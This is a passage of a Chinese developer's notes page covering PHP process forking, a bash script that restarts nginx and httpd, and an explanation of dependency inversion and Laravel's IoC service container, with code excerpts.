=&gt; <span class="number">12</span>,...) <span class="comment">// 内部结果</span></span><br><span class="line">    </span><br><span class="line">    $result[<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...) <span class="comment">// 内部结果</span></span><br><span class="line">    这个时候你可能已经看出了端倪。父子关系变成了 <span class="number">5</span> &gt; <span class="number">12</span> &gt; <span class="number">23</span>，而这组关系，全部存储在了id=<span class="number">5</span>的这个顶级元素中，以多重的children元素实现了父子孙结构。</span><br></pre></td></tr></table></figure>
<h3 id="PHP进程分支设计"><a href="#PHP进程分支设计" class="headerlink" title="PHP进程分支设计"></a>PHP进程分支设计</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/tangshuang/php-events-async-callback https://www.tangshuang.net/2086.html</span></span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"><span class="keyword">if</span>($pid &gt; <span class="number">0</span>)&#123; <span class="comment">//父进程代码</span></span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">elseif($pid == <span class="number">0</span>) &#123; <span class="comment">//子进程代码</span></span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">你会发现httpd或php-fpm的进程会增加，也就是说，pcntl其实是通过重新开启php进程，并通过其他机制实现进程之间的通信的。</span><br><span class="line">proc_open，popen也是利用httpd来实现多进程</span><br><span class="line"></span><br><span class="line">$proc=proc_open(<span class="string">"echo foo"</span>, array(  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"r"</span>),  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"w"</span>),  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"w"</span>)</span><br><span class="line">), $pipes);  </span><br><span class="line">print stream_get_contents($pipes[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span> <span class="string">'Events.php'</span>;</span><br><span class="line"><span class="built_in">require</span> <span class="string">'EventListener.class.php'</span>;</span><br><span class="line"></span><br><span class="line">$EventListener = <span class="keyword">new</span> EventListener(<span class="string">'timeout'</span>);</span><br><span class="line">$EventListener-&gt;add(<span class="string">'timeout'</span>,<span class="string">'setTimeout'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setTimeout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  sleep(<span class="number">10</span>);</span><br><span class="line">  file_put_contents(<span class="string">'./log.txt'</span>,<span class="string">'延时回调成功，现在时间：'</span>.date(<span class="string">'Y-m-d H:i:s'</span>),FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你自己的代码流程https://github.com/tangshuang/php-events-async-callback</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">'./log.txt'</span>,<span class="string">'延时操作开始，现在时间：'</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"\r"</span>,LOCK_EX);</span><br><span class="line">$EventListener-&gt;run(<span class="string">'timeout'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="shell重启服务"><a href="#shell重启服务" class="headerlink" title="shell重启服务"></a>shell重启服务</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在shell脚本中对服务进行判断，如果nginx或者httpd宕机了，就执行一条重启命令：</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">#nginx</span><br><span class="line">ps -ef | grep nginx |grep -v grep &gt; <span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ $? != <span class="number">0</span> ];then</span><br><span class="line">       service nginx restart &gt; <span class="regexp">/dev/</span>nullfi</span><br><span class="line">#httpd</span><br><span class="line">ps -ef | grep httpd |grep -v grep &gt; <span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ $? != <span class="number">0</span> ];then</span><br><span class="line">       service httpd restart &gt; <span class="regexp">/dev/</span>nullfi</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-IoC-服务容器类管理工具"><a href="#Laravel-IoC-服务容器类管理工具" class="headerlink" title="Laravel IoC 服务容器类管理工具"></a>Laravel IoC 服务容器类管理工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line">高层次的模块不应该依赖于低层次的模块，两者都应该依赖于抽象接口。</span><br><span class="line"></span><br><span class="line">抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口。</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQLConnection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 数据库连接</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      var_dump(‘MYSQL Connection’);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordReminder</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @var MySQLConnection</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     private $dbConnection;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">MySQLConnection $dbConnection</span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;dbConnection = $dbConnection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">大家常常会有一个误解，那就是依赖反转就只是依赖注入的另一种说法。但其实二者是不同的。在上面的代码示例中，尽管在 PasswordReminder 类中注入了 MySQLConnection 类，但它还是依赖于 MySQLConnection 类。</span><br><span class="line"></span><br><span class="line">然而，高层次模块 PasswordReminder 是不应该依赖于低层次模块 MySQLConnection 的。</span><br><span class="line"></span><br><span class="line">如果我们想要把 MySQLConnection 改成 MongoDBConnection，那我们就还得手动修改 PasswordReminder 类构造函数里的依赖。</span><br><span class="line"></span><br><span class="line">interface ConnectionInterface</span><br><span class="line">&#123;</span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">DbConnection</span> <span class="title">implements</span> <span class="title">ConnectionInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 数据库连接</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   var_dump(‘MYSQL Connection’);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordReminder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @var DBConnection</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    private $dbConnection;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">ConnectionInterface $dbConnection</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;dbConnection = $dbConnection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> IoC 容器简单地理解为就是一个容器，里面装的是类的依赖。</span><br><span class="line">namespace App\Repositories;</span><br><span class="line"></span><br><span class="line">interface OrderRepositoryInterface </span><br><span class="line">&#123;</span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"><span class="title">namespace</span> <span class="title">App</span>\<span class="title">Repositories</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">DbOrderRepository</span> <span class="title">implements</span> <span class="title">OrderRepositoryInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Getting all from mysql'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use App\Http\Requests;</span><br><span class="line">use App\Repositories\OrderRepositoryInterface;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrdersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $order;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">OrderRepositoryInterface $order</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">     $<span class="keyword">this</span>-&gt;order = $order;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">     dd($<span class="keyword">this</span>-&gt;order-&gt;getAll());</span><br><span class="line">     <span class="keyword">return</span> View::make(orders.index);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">Route::resource(<span class="string">'orders'</span>, <span class="string">'OrdersController'</span>);</span><br><span class="line">App::bind(<span class="string">'App\Repositories\OrderRepositoryInterface'</span>, <span class="string">'App\Repositories\DbOrderRepository'</span>);</span><br><span class="line">定义一个容器类：</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleContainer</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    protected <span class="keyword">static</span> $container = [];</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">$name, Callable $resolver</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">static</span>::$container[$name] = $resolver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(isset(<span class="keyword">static</span>::$container[$name]))&#123;</span><br><span class="line">        $resolver = <span class="keyword">static</span>::$container[$name] ;</span><br><span class="line">        <span class="keyword">return</span> $resolver();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Binding does not exist in containeer"</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogToDatabase</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$message</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       var_dump(<span class="string">'log the message to a database :'</span>.$message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $logger;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">LogToDatabase $logger</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;logger = $logger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $user = <span class="string">'JohnDoe'</span>;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;logger-&gt;execute($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">绑定依赖：</span><br><span class="line"></span><br><span class="line">SimpleContainer::bind(<span class="string">'Foo'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> UsersController(<span class="keyword">new</span> LogToDatabase);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line">$foo = SimpleContainer::make(<span class="string">'Foo'</span>);</span><br><span class="line"></span><br><span class="line">print_r($foo-&gt;show());</span><br><span class="line"></span><br><span class="line">Laravel 的服务容器源码：vendor/laravel/framwork/src/Illuminate/Container/Container.php</span><br><span class="line"></span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">$abstract, $concrete = null, $shared = false</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = $<span class="keyword">this</span>-&gt;normalize($abstract);</span><br><span class="line"></span><br><span class="line">        $concrete = $<span class="keyword">this</span>-&gt;normalize($concrete);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array($abstract)) &#123;</span><br><span class="line">           list($abstract, $alias) = $<span class="keyword">this</span>-&gt;extractAlias($abstract);</span><br><span class="line"></span><br><span class="line">           $<span class="keyword">this</span>-&gt;alias($abstract, $alias);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;dropStaleInstances($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($concrete)) &#123;</span><br><span class="line">            $concrete = $abstract;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $concrete <span class="keyword">instanceof</span> Closure) &#123;</span><br><span class="line">            $concrete = $<span class="keyword">this</span>-&gt;getClosure($abstract, $concrete);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;bindings[$abstract] = compact(<span class="string">'concrete'</span>, <span class="string">'shared'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;resolved($abstract)) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;rebound($abstract);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">$abstract, array $parameters = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = $<span class="keyword">this</span>-&gt;getAlias($<span class="keyword">this</span>-&gt;normalize($abstract));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;instances[$abstract];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $concrete = $<span class="keyword">this</span>-&gt;getConcrete($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">            $object = $<span class="keyword">this</span>-&gt;build($concrete, $parameters);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $object = $<span class="keyword">this</span>-&gt;make($concrete, $parameters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;getExtenders($abstract) <span class="keyword">as</span> $extender) &#123;</span><br><span class="line">            $object = $extender($object, $<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isShared($abstract)) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;instances[$abstract] = $object;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       $<span class="keyword">this</span>-&gt;fireResolvingCallbacks($abstract, $object);</span><br><span class="line"></span><br><span class="line">       $<span class="keyword">this</span>-&gt;resolved[$abstract] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> $object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params">$concrete, array $parameters = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($concrete <span class="keyword">instanceof</span> Closure) &#123;</span><br><span class="line">            <span class="keyword">return</span> $concrete($<span class="keyword">this</span>, $parameters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       $reflector = <span class="keyword">new</span> ReflectionClass($concrete);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $reflector-&gt;isInstantiable()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (! empty($<span class="keyword">this</span>-&gt;buildStack)) &#123;</span><br><span class="line">                $previous = implode(<span class="string">', '</span>, $<span class="keyword">this</span>-&gt;buildStack);</span><br><span class="line">                $message = <span class="string">"Target [$concrete] is not instantiable while building [$previous]."</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $message = <span class="string">"Target [$concrete] is not instantiable."</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> BindingResolutionException($message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         $<span class="keyword">this</span>-&gt;buildStack[] = $concrete;</span><br><span class="line"></span><br><span class="line">         $<span class="keyword">constructor</span> = $reflector-&gt;getConstructor();</span><br><span class="line"></span><br><span class="line">        if (is_null($<span class="keyword">constructor</span>)) &#123;</span><br><span class="line">            array_pop($<span class="keyword">this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> $concrete;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $dependencies = $<span class="keyword">constructor</span>-&gt;getParameters();</span><br><span class="line">        $parameters = $this-&gt;keyParametersByArgument(</span><br><span class="line">            $dependencies, $parameters</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">         $instances = $this-&gt;getDependencies($dependencies,$parameters);</span><br><span class="line"></span><br><span class="line">         array_pop($this-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">         return $reflector-&gt;newInstanceArgs($instances);</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;app-&gt;bind('HelpSpot\API', function ($app) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HelpSpot\API($app-&gt;make(<span class="string">'HttpClient'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">$api = <span class="keyword">new</span> HelpSpot\API(<span class="keyword">new</span> HttpClient);</span><br><span class="line"></span><br><span class="line">$<span class="keyword">this</span>-&gt;app-&gt;instance(<span class="string">'HelpSpot\API'</span>, $api);</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/26922 https://github.com/nahidulhasan/laravel-service-container</span></span><br><span class="line">Ioc 是一个简单的组件，可以更加方便地解析依赖项。你可以将对象形容为容器，并且每次解析类时，都会自动注入依赖项。</span><br><span class="line">$auth = <span class="keyword">new</span> SimpleAuth( <span class="keyword">new</span> FileSessionStorage() );</span><br><span class="line">因为 Application 类继承自 Container 类，所以你可以通过 App 门面来访问容器。</span><br><span class="line"></span><br><span class="line">App::bind( <span class="string">'FileSessionStorage'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> FileSessionStorage;</span><br><span class="line">&#125;);</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/26721</span></span><br><span class="line"></span><br><span class="line">App:bind( <span class="string">'SessionStorage'</span>, <span class="string">'MysqlSessionStorage'</span> );<span class="comment">//SessionStorage是接口,MysqlSessionStorage和FileSessionStorage继承ta，调用的时候注入SessionStorage $session </span></span><br><span class="line">如果我们想要切换我们的存储服务，我们只要变更一下这个绑定。App:bind( <span class="string">'SessionStorage'</span>, <span class="string">'FileSessionStorage '</span> );</span><br><span class="line"></span><br><span class="line">laravel面试哪些问题 v2ex</span><br></pre></td></tr></table></figure>
<h3 id="laravel函数"><a href="#laravel函数" class="headerlink" title="laravel函数"></a>laravel函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 